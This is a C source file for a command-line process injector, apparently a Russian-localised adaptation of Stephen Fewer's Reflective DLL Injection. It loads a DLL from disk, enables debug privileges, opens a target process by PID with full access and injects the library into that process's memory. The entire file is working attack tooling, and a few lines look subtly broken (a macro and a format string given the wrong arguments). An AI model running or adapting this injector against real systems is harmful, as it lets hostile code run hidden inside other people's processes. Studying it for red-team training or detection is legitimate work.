//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include "LoadLibraryR.h"

#pragma comment(lib,"Advapi32.lib")

#define BREAK_WITH_ERROR( e ) { fprintf(file, "%s | код: %d\n",e, GetLastError() ); break; }


#define PID "--pid"
#define DLL "--dll"
#define OUTPUT "--output"
#define HELP "--help"

#define ARGC_MIN 5
#define ARGC_MAX 7

typedef struct injection_data
{
	char dll_file[BUFSIZ];
	char output_file[BUFSIZ];
	DWORD pid;
} INJECTION_DATA, * PINJECTION_DATA;

FILE* file; //поток вывода (консоль или файл)

void help_print(char* first_argv)
{
	fprintf(file, "   Usage: %s <options> <param> [, <param>, ...]\n\n", first_argv);
	fprintf(file, "   Options:\n");
	fprintf(file, "\t%s\t\t\t\t: Process identifator\n", PID);
	fprintf(file, "\t%s\t\t\t\t: File with the injection code\n", DLL);
	fprintf(file, "\t%s\t\t\t: File with result of work\n", OUTPUT);
	fprintf(file, "\t%s\t\t\t\t: Show this help\n", HELP);
	fprintf(file, "\n   Example:\n");
	fprintf(file, "\t%s --pid 12345 --dll C:\\uf.dll --output result.txt\n", first_argv);
}

INJECTION_DATA get_injection_daata(int argc, char* argv[])
{
	INJECTION_DATA to_return;
	memset(&to_return, NULL, sizeof(to_return));
	setlocale(LC_ALL, "rus");

	for (size_t i = 0; i < argc - 1; i++)
	{
		if (strcmp(PID, argv[i]) == 0)
			to_return.pid = atoi(argv[i + 1]);

		if (strcmp(DLL, argv[i]) == 0)
			strcpy(to_return.dll_file, argv[i + 1]);

		if (strcmp(OUTPUT, argv[i]) == 0)
			strcpy(to_return.output_file, argv[i + 1]);
	}
	return to_return;
}

int main( int argc, char * argv[] ){
	
	HANDLE hFile          = NULL;
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	LPVOID lpBuffer       = NULL;
	DWORD dwLength        = 0;
	DWORD dwBytesRead     = 0;
	DWORD dwProcessId     = 0;
	TOKEN_PRIVILEGES priv = {0};

	file = stdout;
	if (argc < ARGC_MIN || argc > ARGC_MAX)
	{
		help_print(argv[0]);
		exit(ERROR);
	}
	INJECTION_DATA  idata = get_injection_daata(argc, argv);
	if (strlen(idata.output_file) > 0)
		file = fopen(idata.output_file, "w");
	char* cpDllFile;


	do
	{
		dwProcessId = idata.pid;
		cpDllFile = idata.dll_file;

		fprintf(file, "1. Попытка открыть файл на чтение: ");
		hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
		if( hFile == INVALID_HANDLE_VALUE )
			BREAK_WITH_ERROR( "не удалось открыть файл" );

		dwLength = GetFileSize( hFile, NULL );
		if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
			BREAK_WITH_ERROR( "не удалось получить размер файла" );
		fprintf(file, "файл открыт успешно | дескриптор файла %d | размер файла %d байт\n", hFile, dwLength);

		fprintf(file, "2. Загрузка файла в память: ");

		lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength );
		if( !lpBuffer )
			BREAK_WITH_ERROR( "ошибка при выделении памяти в куче процесса" );

		if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
			BREAK_WITH_ERROR( "ошибка при загрузке файла в память" );
		fprintf(file, "файл успешно загружен по адресу 0x%p\n", lpBuffer);

		fprintf(file, "3. Установка привилегий отладчика для текущего процесса: ");
		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		{
			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				if (AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL ))
					fprintf(file, "получены привилегии отладчика\n");
				else fprintf(file, "привилегии отладчкика не получены\n");
			CloseHandle( hToken );
		}

		fprintf(file, "4. Попытка открыть процесс %d c правами PROCESS_ALL_ACCESS: ");

		hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, dwProcessId );
		if( !hProcess )
			BREAK_WITH_ERROR( "невозможно открыть процесс" );
		fprintf(file, "процесс открыт | дескриптор %d\n", hProcess);

		fprintf(file, "5. Внедрение библиотеки в память стороннего процесса: \n");

		hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL, file );
		if( !hModule )
			BREAK_WITH_ERROR( "\n-- ОШИБКА ПРИ ВНЕДРЕНИИ БИБЛИОТЕКИ В ПАМЯТЬ ПРОЦЕССА %d --\n",dwProcessId);

		fprintf(file, "\n-- ФАЙЛ УСПЕШНО ВНЕДРЕН В ПАМЯТЬ ПРОЦЕССА %d --\n",dwProcessId);

		//WaitForSingleObject( hModule, -1 );

	} while( 0 );

	if( lpBuffer )
		HeapFree( GetProcessHeap(), 0, lpBuffer );

	if( hProcess )
		CloseHandle( hProcess );

	return 0;
}